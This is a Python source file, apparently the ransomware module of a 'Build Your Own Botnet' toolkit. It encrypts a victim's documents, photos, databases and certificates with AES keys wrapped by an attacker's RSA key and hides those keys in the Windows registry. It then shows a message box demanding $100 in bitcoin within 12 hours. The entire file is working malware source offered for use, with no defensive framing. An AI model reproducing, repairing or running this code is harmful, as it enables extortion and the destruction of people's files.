#!/usr/bin/python
# -*- coding: utf-8 -*-
'Ransom (Build Your Own Botnet)'

# standard library
import os
import sys
import time
import Queue
import base64
import hashlib

try:
    from StringIO import StringIO  # Python 2
except ImportError:
    from io import StringIO        # Python 3

# packages
import Crypto.Cipher.AES
import Crypto.PublicKey.RSA
import Crypto.Cipher.PKCS1_OAEP
if sys.platform == 'win32':
    import _winreg

# utilities
import util

# globals
packages = ['_winreg','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']
platforms = ['win32']
threads = {}
tasks = Queue.Queue()
registry_key = hashlib.md5(util.mac_address()).hexdigest()
filetypes = ['.pdf','.zip','.ppt','.doc','.docx','.rtf','.jpg','.jpeg','.png','.img','.gif','.mp3','.mp4','.mpeg',
	     '.mov','.avi','.wmv','.rtf','.txt','.html','.php','.js','.css','.odt', '.ods', '.odp', '.odm', '.odc',
             '.odb', '.doc', '.docx', '.docm', '.wps', '.xls', '.xlsx', '.xlsm', '.xlsb', '.xlk', '.ppt', '.pptx',
             '.pptm', '.mdb', '.accdb', '.pst', '.dwg', '.dxf', '.dxg', '.wpd', '.rtf', '.wb2', '.mdf', '.dbf',
             '.psd', '.pdd', '.pdf', '.eps', '.ai', '.indd', '.cdr', '.jpe', '.jpeg','.tmp','.log','.py',
             '.dng', '.3fr', '.arw', '.srf', '.sr2', '.bay', '.crw', '.cr2', '.dcr', '.rwl', '.rw2','.pyc',
             '.kdc', '.erf', '.mef', '.mrw', '.nef', '.nrw', '.orf', '.raf', '.raw',  '.r3d', '.ptx','.css',
             '.pef', '.srw', '.x3f', '.der', '.cer', '.crt', '.pem', '.pfx', '.p12', '.p7b', '.p7c','.html',
             '.css','.js','.rb','.xml','.wmi','.sh','.asp','.aspx','.plist','.sql','.vbs','.ps1','.sqlite']
usage = 'ransom <encrypt/decrypt/payment>'
description = """
Encrypt the files on a client host machine and ransom the decryption key
back to the currently logged-in user for a payment in Bitcoin to a randomly
generated temporary wallet address that expires in 12 hours
"""

# main
def _threader(tasks):
    try:
        retries = 0
        while True:
            try:
                method, task = tasks.get_nowait()
                if callable(method):
                    method(task)
                tasks.task_done()
            except:
                if retries < 3:
                    retries += 1
                    time.sleep(1)
                    continue
                else:
                    break
    except Exception as e:
        util.log("{} error: {}".format(_threader.__name__, str(e)))

@util.threaded
def _iter_files(rsa_key, base_dir=None):
    try:
        if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
            if base_dir:
                if os.path.isdir(base_dir):
                    return os.path.walk(base_dir, lambda _, dirname, files: [globals()['tasks'].put_nowait((encrypt_file, (os.path.join(dirname, filename), rsa_key))) for filename in files], None)
                else:
                    util.log("Target directory '{}' not found".format(base_dir))
            else:
                cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
                reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, globals()['registry_key'], 0, _winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        filename, key, _ = _winreg.EnumValue(reg_key, i)
                        key = cipher.decrypt(base64.b64decode(key))
                        globals()['tasks'].put_nowait((decrypt_file, (filename, key)))
                        i += 1
                    except:
                        _winreg.CloseKey(reg_key)
                        break
    except Exception as e:
        util.log('{} error: {}'.format(_iter_files.__name__, str(e)))

def request_payment(bitcoin_wallet):
    """
    Request ransom payment from user with a Windows alert message box

    `Required`
    :param str bitcoin_wallet:      a valid Bitcoin wallet address

    """
    try:
        alert = util.alert("Your personal files have been encrypted. The service fee to decrypt your files is $100 USD worth of bitcoin (try www.coinbase.com or Google 'how to buy bitcoin'). The service fee must be tranferred to the following bitcoin wallet address: %s. The service fee must be paid within 12 hours or your files will remain encrypted permanently. Deadline: %s" % (bitcoin_wallet, time.localtime(time.time() + 60 * 60 * 12)))
        return "Launched a Windows Message Box with ransom payment information"
    except Exception as e:
        return "{} error: {}".format(request_payment.__name__, str(e))

def encrypt_aes(plaintext, key, padding=chr(0)):
    """
    AES-256-OCB encryption

    `Requires`
    :param str plaintext:   plain text/data
    :param str key:         session encryption key

    `Optional`
    :param str padding:     default: (null byte)

    Returns encrypted ciphertext as base64-encoded string

    """
    cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    output = b''.join((cipher.nonce, tag, ciphertext))
    return base64.b64encode(output)

def decrypt_aes(ciphertext, key, padding=chr(0)):
    """
    AES-256-OCB decryption

    `Requires`
    :param str ciphertext:  encrypted block of data
    :param str key:         session encryption key

    `Optional`
    :param str padding:     default: (null byte)

    Returns decrypted plaintext as string

    """
    data = StringIO(base64.b64decode(ciphertext))
    nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
    cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

def encrypt_file(filename, rsa_key):
    """
    Encrypt a file with AES-256-OCB symmetric encryption
    using a randomly generated key, encrypt the key
    with RSA-2048 asymmetric encryption, then store the
    filename and RSA-encrypted AES-key as a key in the
    Windows Registry

    `Requires`
    :param str filename:          target filename
    :param RsaKey rsa_key:        2048-bit public RSA key

    Returns True if succesful, otherwise False

    """
    try:
        if os.path.isfile(filename):
            if os.path.splitext(filename)[1] in globals()['filetypes']:
                if isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
                    cipher = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
                    aes_key = os.urandom(32)
                    with open(filename, 'rb') as fp:
                        data = fp.read()
                    ciphertext = encrypt_aes(data, aes_key)
                    with open(filename, 'wb') as fd:
                        fd.write(ciphertext)
                    key = base64.b64encode(cipher.encrypt(aes_key))
                    util.registry_key(globals()['registry_key'], filename, key)
                    util.log('{} encrypted'.format(filename))
                    return True
        else:
            util.log("File '{}' not found".format(filename))
    except Exception as e:
        util.log("{} error: {}".format(encrypt_file.__name__, str(e)))
    return False

def decrypt_file(filename, key):
    """
    Decrypt a file that was encrypted with AES-256-OCB encryption

    `Required`
    :param str filename:    target filename
    :param str aes_key:     256-bit key

    Returns True if succesful, otherwise False

    """
    try:
        if os.path.isfile(filename):
            with open(filename, 'rb') as fp:
                ciphertext = fp.read()
            plaintext = decrypt_aes(ciphertext, key)
            with open(filename, 'wb') as fd:
                fd.write(plaintext)
            util.log('{} decrypted'.format(filename))
            return True
        else:
            util.log("File '{}' not found".format(filename))
    except Exception as e:
        util.log("{} error: {}".format(decrypt_file.__name__, str(e)))
    return False

def encrypt_files(args):
    """
    Encrypt all files that are not required for the machine to function

    `Required`
    :param str args:    filename and RSA key separated by a space

    """
    try:
        target, _, rsa_key = args.partition(' ')
        if os.path.exists(target):
            if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
                rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
            if not rsa_key.can_encrypt():
                return "Error: RSA key cannot encrypt"
            if os.path.isfile(target):
                return encrypt_file(target, rsa_key)
            if os.path.isdir(target):
                globals()['threads']['iter_files'] = _iter_files(rsa_key, base_dir=target)
                globals()['threads']['encrypt_files'] = _threader()
                return "Encrypting files"
        else:
            return "File '{}' does not exist".format(target)
    except Exception as e:
        util.log("{} error: {}".format(encrypt_files.__name__, str(e)))

def decrypt_files(rsa_key):
    """
    Decrypt all encrypted files on host machine

    `Required`
    :param str rsa_key:     RSA private key in PEM format

   """
    try:
        if not isinstance(rsa_key, Crypto.PublicKey.RSA.RsaKey):
            rsa_key = Crypto.PublicKey.RSA.importKey(rsa_key)
        if not rsa_key.has_private():
            return "Error: RSA key cannot decrypt"
        globals()['threads']['iter_files'] = _iter_files(rsa_key)
        globals()['threads']['decrypt_files'] = _threader()
        return "Decrypting files"
    except Exception as e:
        util.log("{} error: {}".format(decrypt_files.__name__, str(e)))

def run(args=None):
    """
    Run the ransom module

    `Required`
    :param str args:  encrypt, decrypt, payment

    """
    global usage
    if args:
        cmd, _, action = str(args).partition(' ')
        if 'payment' in cmd:
            return request_payment(action)
        elif 'decrypt' in cmd:
            return decrypt_files(action)
        elif 'encrypt' in cmd:
            reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, globals()['registry_key'])
            return encrypt_files(action)
    return usage
